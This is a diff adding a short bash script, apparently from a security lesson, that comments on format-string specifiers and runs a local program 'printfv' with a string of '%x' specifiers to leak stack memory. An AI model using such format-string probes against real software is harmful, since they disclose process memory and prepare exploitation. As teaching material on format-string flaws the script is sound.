@@ -1,0 +1,8 @@
+#!/usr/bin/env bash
+
+# %s - reads a character string from the process' memory
+# %n - writes an integer to locations in the process' memory
+# %x - reads data from the stack
+
+echo "./printfv AAAAAAAAAAAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x"
+./printfv "AAAAAAAAAAAAA.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x"
